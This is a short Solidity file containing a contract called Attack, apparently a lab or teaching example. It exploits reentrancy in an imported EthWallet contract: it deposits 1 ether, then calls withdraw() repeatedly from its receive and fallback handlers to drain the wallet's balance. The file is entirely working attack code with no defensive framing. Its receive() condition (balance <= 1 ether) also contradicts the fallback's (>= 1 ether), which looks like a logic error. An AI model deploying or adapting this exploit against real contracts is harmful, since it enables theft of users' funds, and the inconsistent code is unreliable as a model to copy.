// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./EthWallet.sol";

contract Attack {
    EthWallet public ethWallet;

    constructor(address _ethWalletAddress) {
        ethWallet = EthWallet(_ethWalletAddress);
    }

    // Function to receive Ether. msg.data must be empty
    receive() external payable {
        if (address(ethWallet).balance <= 1 ether) {
            ethWallet.withdraw(1 ether);
        }
    }

    // Fallback function used for re-entrancy attack
    fallback() external payable {
        if (address(ethWallet).balance >= 1 ether) {
            ethWallet.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether");
        ethWallet.deposit{value: 1 ether}();
        ethWallet.withdraw(1 ether);
    }

    // Function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
